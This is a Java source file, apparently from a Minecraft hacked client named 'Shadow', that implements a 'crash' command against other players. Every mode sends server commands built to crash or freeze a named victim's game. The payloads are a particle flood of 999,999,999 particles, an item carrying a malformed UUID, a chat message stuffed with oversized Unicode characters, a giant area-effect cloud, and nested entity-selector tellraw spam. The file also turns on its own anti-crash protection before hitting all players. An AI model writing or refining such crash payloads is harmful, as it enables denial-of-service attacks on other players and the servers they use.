package net.shadow.feature.command;

import net.minecraft.client.MinecraftClient;
import net.minecraft.network.packet.c2s.play.ChatMessageC2SPacket;
import net.shadow.Shadow;
import net.shadow.feature.ModuleRegistry;
import net.shadow.feature.base.Command;
import java.util.List;
import net.shadow.plugin.Notification;
import net.shadow.plugin.NotificationSystem;
import net.shadow.utils.ChatUtils;
import net.shadow.utils.PlayerUtils;
import net.shadow.utils.Utils;

import java.util.Arrays;

public class CrashCmd extends Command {
    public CrashCmd() {
        super("crash", "crash players games");
    }

    @Override
    public List<String> completions(int index, String[] args){
        if(index == 0){
            return List.of(Utils.getPlayersFromWorld());
        }
        if(index == 1){
            return List.of(new String[]{"Particle", "Invalid-UUID", "Text", "Entity", "Tellraw"});
        }
        return List.of(new String[0]);
    }

    @Override
    public void call(String[] args) {
        MinecraftClient client = MinecraftClient.getInstance();
        if (args.length < 1) {
            ChatUtils.message("Please use the format >crash <player> (optional)<mode>");
            return;
        }

        if (args.length > 1) {
            String mode = args[1].toLowerCase();
            switch (mode) {
                case "particle" -> {
                    String player = PlayerUtils.completeName(args[0]);
                    Shadow.c.player.networkHandler.sendPacket(new ChatMessageC2SPacket("/execute as " + player + " at @s run particle flame ~ ~ ~ 1 1 1 0 999999999 normal @s"));
                    Notification n = new Notification("PlayerCrash", player + " should be crashed", 150);
                    NotificationSystem.notifications.add(n);
                }
                case "invalid-uuid" -> {
                    String player2 = PlayerUtils.completeName(args[0]);
                    new Thread(() -> {
                        Shadow.c.player.networkHandler.sendPacket(new ChatMessageC2SPacket("/execute run item replace entity " + player2 + " weapon.mainhand with barrier{display:{Name:'{\"text\":\"test\",\"hoverEvent\":{\"action\":\"show_entity\",\"contents\":{\"id\":\"f97c0d7b-6413-4558-a409-88f09a8f9adb[][][][][][][]][][][\",\"type\":\"minecraft:player\"}}}}'}} 1"));
                        try {
                            Thread.sleep(1000L);
                        } catch (InterruptedException e) {
                            e.printStackTrace();
                        }
                        Shadow.c.player.networkHandler.sendPacket(new ChatMessageC2SPacket("/execute run item replace entity " + player2 + " weapon.mainhand with air"));
                    }).start();
                    NotificationSystem.notifications.add(new Notification("PlayerCrash", player2 + " should be frozen", 150));
                }
                case "text" -> {
                    String playernull = PlayerUtils.completeName(args[0]);
                    String s = "𪚥".repeat(245);
                    String x = "/msg " + playernull + " &l&a&k" + s;
                    Shadow.c.player.networkHandler.sendPacket(new ChatMessageC2SPacket(x));
                }
                case "entity" -> {
                    String player4 = PlayerUtils.completeName(args[0]);
                    Shadow.c.player.networkHandler.sendPacket(new ChatMessageC2SPacket("/execute run tp " + player4 + " 100000 100 100000"));
                    Shadow.c.player.networkHandler.sendPacket(new ChatMessageC2SPacket("/summon area_effect_cloud 100000 100 100000 {Radius:9999999999f,Duration:9999999}"));
                    NotificationSystem.notifications.add(new Notification("PlayerCrash", player4 + " should be frozen", 150));
                }
                case "tellraw" -> {
                    String player5 = PlayerUtils.completeName(args[0]);
                    Shadow.c.player.networkHandler.sendPacket(new ChatMessageC2SPacket("/execute as @e[limit=900] run execute as @e[limit=9000] run tellraw " + player5 + " {\"text\":\"BANG!\"}"));
                    NotificationSystem.notifications.add(new Notification("PlayerCrash", player5 + " should be frozen", 150));
                }
                default ->{
                }
            }
        } else {
            String player = PlayerUtils.completeName(args[0]);
            if (player.equals("@a") && !ModuleRegistry.find("AntiCrash").isEnabled()) {
                ChatUtils.message("Turning on anticrash");
                ModuleRegistry.find("AntiCrash").setEnabled(true);
            }
            Shadow.c.player.networkHandler.sendPacket(new ChatMessageC2SPacket("/execute as " + player + " at @s run particle flame ~ ~ ~ 1 1 1 0 999999999 normal @s"));
            Notification n = new Notification("PlayerCrash", player + " should be crashed", 150);
            NotificationSystem.notifications.add(n);
        }
    }
}
